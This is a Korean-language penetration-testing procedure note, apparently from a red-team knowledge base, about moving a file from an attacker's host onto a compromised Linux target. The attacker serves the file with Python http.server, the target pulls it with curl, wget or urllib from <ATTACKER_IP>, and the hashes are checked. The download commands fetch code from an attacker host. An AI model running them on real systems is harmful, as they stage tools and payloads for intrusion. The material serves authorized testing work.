---
tags:
  - 환경/linux
  - 서비스/http
시작조건: ["Linux 대상 셸 확보", "Linux 대상에서 공격 호스트 HTTP 포트로 연결 가능"]
필요권한: ["공격 호스트의 원본 파일 읽기 권한", "Linux 대상 저장 경로 쓰기 권한"]
필요조건: ["전용 HTTP 제공 디렉터리", "curl·wget·Python 3 중 하나", "양쪽 SHA-256 확인 수단"]
결과: ["Linux 대상에 반입한 파일", "송신본과 수신본의 SHA-256 비교 결과"]
---

# Linux HTTP 파일 반입

## 한 줄 판단

Linux 대상 셸에서 공격 호스트의 HTTP 포트로 연결할 수 있고 쓸 수 있는 경로가 있으면, 공격 호스트가 전용 디렉터리의 파일 하나를 제공하고 대상의 `curl`·`wget`·Python 3 중 사용 가능한 클라이언트로 저장한 뒤 양쪽 SHA-256을 비교한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | Linux 대상에서 공격 호스트 `<ATTACKER_IP>:<HTTP_PORT>`로 TCP 연결 가능 | 기존 연결 정보와 HTTP 서버 요청 로그 | 주소·route·proxy·방화벽과 통신 방향 확인 |
| 현재 계정 또는 인증 수단 | 인증 없는 전용 HTTP listener를 사용하므로 원격 계정은 불필요 | 공격 호스트 bind 주소와 대상에서 도달할 URL 확인 | 인증·암호화가 필요하면 SSH·HTTPS 등 승인된 경로 선택 |
| 현재 권한 | 공격 호스트는 원본 읽기·포트 bind, 대상 계정은 목적지 쓰기 가능 | `test -r`, `ss -ltnp`, `test -w` | 1024 미만 포트를 피하고 별도 writable 경로 선택 |
| 공격 대상의 조건 | 대상에 `curl`, `wget` 또는 Python 3 중 하나가 있고 파일을 저장할 수 있음 | `command -v curl wget python3`, `test ! -e` | 모두 없으면 [[제한 환경 파일 반입]]에서 Ncat·내장 바이너리 확인 |
| 필요한 파일·목록·주소 | 전용 제공 디렉터리, 원본 파일명, 고유한 목적지와 SHA-256 | `test -f`, `sha256sum`, 대상 파일 부재 확인 | 원본·목적지·URL 경로를 먼저 수정 |

Python의 `http.server`는 인증·TLS가 없는 임시 제공 서버다. 승인된 격리 환경에서 전용 디렉터리만 노출하고, 민감 파일이나 다른 작업 산출물이 있는 디렉터리를 그대로 제공하지 않는다.

## 실행

### 1. Linux 공격 호스트에서 HTTP 서버 시작

Python 3의 `--directory`를 지원하는 환경에서 원본 파일 하나만 둔 전용 디렉터리를 제공한다. 로그는 제공 디렉터리 밖의 새 경로를 사용한다. 실행 전 포트와 로그 경로를 확인하고 이번 listener PID를 기록한다.

```bash
test -r '<SOURCE_DIRECTORY>/<SOURCE_FILE>'
test ! -e '<HTTP_SERVER_LOG>'
ss -ltnp 'sport = :<HTTP_PORT>'
sha256sum '<SOURCE_DIRECTORY>/<SOURCE_FILE>'
python3 -m http.server --bind <ATTACKER_IP> --directory '<SOURCE_DIRECTORY>' <HTTP_PORT> > '<HTTP_SERVER_LOG>' 2>&1 &
HTTP_SERVER_PID=$!
ps -p "$HTTP_SERVER_PID" -o pid=,args=
```

확인할 출력:

- `ps`에 기록한 PID와 `python3 -m http.server` 명령행이 표시되고 `<HTTP_PORT>`가 그 PID에 의해 listen한다.
- `Address already in use`이면 기존 listener를 종료하지 말고 다른 포트를 선택한다.
- `--directory`가 인식되지 않으면 Python 버전을 확인한다. 기존 작업 디렉터리를 임의로 제공하지 말고 지원되는 Python 3 또는 다른 승인된 파일 서버를 선택한다.

### 2. Linux 대상 호스트에서 사용 가능한 클라이언트 하나 선택

먼저 기존 파일을 덮어쓰지 않을 고유한 목적지를 확인한다. 아래 명령은 대체 경로이며 하나만 실행한다.

```bash
test ! -e '<DESTINATION_FILE>'
test -w '<DESTINATION_DIRECTORY>'
command -v curl wget python3
```

#### `curl`이 있는 경우

```bash
curl --fail --location --output '<DESTINATION_FILE>' 'http://<ATTACKER_IP>:<HTTP_PORT>/<SOURCE_FILE>'
```

#### `wget`이 있는 경우

```bash
wget --output-document='<DESTINATION_FILE>' 'http://<ATTACKER_IP>:<HTTP_PORT>/<SOURCE_FILE>'
```

#### 표준 HTTP 클라이언트가 없고 Python 3만 있는 경우

```bash
python3 -c 'import sys, urllib.request; urllib.request.urlretrieve(sys.argv[1], sys.argv[2])' 'http://<ATTACKER_IP>:<HTTP_PORT>/<SOURCE_FILE>' '<DESTINATION_FILE>'
```

확인할 출력:

- 공격 호스트 로그에 의도한 `GET /<SOURCE_FILE>`과 성공 응답이 기록된다.
- `curl`의 HTTP 오류, `wget`의 실패 상태 또는 Python의 `URLError`·`HTTPError`가 나오면 파일 생성 여부와 관계없이 완료로 판단하지 않는다.

### 3. Linux 대상 호스트에서 파일과 무결성 확인

```bash
ls -l '<DESTINATION_FILE>'
file '<DESTINATION_FILE>'
sha256sum '<DESTINATION_FILE>'
```

대상의 SHA-256이 1단계에서 기록한 원본 SHA-256과 같아야 반입 완료다. 파일 존재나 HTTP `200`만으로 실행 가능 여부를 확정하지 않고 OS·architecture·실행 bit와 정책은 별도로 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 요청 로그에 의도한 경로와 성공 응답이 있고 양쪽 SHA-256이 같음 | 파일이 변형 없이 저장됨 | Linux 파일 반입 | 파일 형식·architecture·실행 권한을 확인한 뒤 필요한 절차 수행 |
| HTTP 성공 응답이지만 hash가 다름 | 다른 파일, 중단 전송 또는 기존·부분 파일일 수 있음 | 손상된 파일 | 실행하지 말고 목적지 부재와 URL을 확인해 새 경로로 재전송 |
| `404` 또는 원본 읽기 오류 | 제공 디렉터리·파일명·권한 불일치 | 반입 시작 전 실패 | 공격 호스트의 `<SOURCE_DIRECTORY>/<SOURCE_FILE>` 대조 |
| 연결 거부·timeout이고 요청 로그가 없음 | 주소·포트·route·방화벽 또는 bind 주소 문제 | 전송 경로 미확보 | 대상에서 공격 호스트 방향의 도달성과 listener PID 확인 |
| 파일 hash는 같지만 실행 거부 | 전송은 완료됐으나 실행 조건이 맞지 않음 | 파일 반입만 완료 | 실행 bit·mount 옵션·architecture·정책을 별도 확인 |

## 변경 영향과 복구

이 절차가 새로 만드는 항목은 대상의 `<DESTINATION_FILE>`, 공격 호스트의 HTTP listener와 `<HTTP_SERVER_LOG>`이다. `<SOURCE_DIRECTORY>/<SOURCE_FILE>`은 입력 자료이므로 이 절차에서 삭제하지 않는다.

1. Linux 대상에서 반입 파일을 사용하는 process가 있다면 이번 실행에서 기록한 PID를 먼저 정상 종료한다.
2. 작업 전 존재하지 않았고 기록한 경로·SHA-256과 같은 `<DESTINATION_FILE>`만 `rm -- '<DESTINATION_FILE>'`로 제거하고 `test ! -e '<DESTINATION_FILE>'`로 확인한다.
3. 공격 호스트에서 `ps -p <HTTP_SERVER_PID> -o pid=,args=`로 기록한 listener가 맞는지 대조한 뒤 `kill <HTTP_SERVER_PID>`로 종료한다.
4. `ps -p <HTTP_SERVER_PID>` 출력이 비고 `<HTTP_PORT>`가 작업 전 상태로 돌아왔는지 확인한다. 결과 인계가 끝난 뒤 이번 실행에서 만든 exact `<HTTP_SERVER_LOG>`만 `rm -- '<HTTP_SERVER_LOG>'`로 제거한다.

대상 연결이 이미 끊겨 `<DESTINATION_FILE>`의 존재나 사용 process를 확인할 수 없으면 원격 정리 완료로 기록하지 않는다. PID가 재사용되었거나 command line이 다르면 종료하지 않고 listener 식별부터 다시 확인한다.

## 관련 도구

- [[curl]]

## 관련 상태 라우터

- [[상황별 파일 전송]]
- [[제한 환경 파일 반입]]

## 참고 링크

- [Python `http.server` command-line interface](https://docs.python.org/3/library/http.server.html#command-line-interface)
- [Python `urllib.request`](https://docs.python.org/3/library/urllib.request.html)
- [curl command-line options](https://curl.se/docs/manpage.html)
- [GNU Wget manual](https://www.gnu.org/software/wget/manual/wget.html)
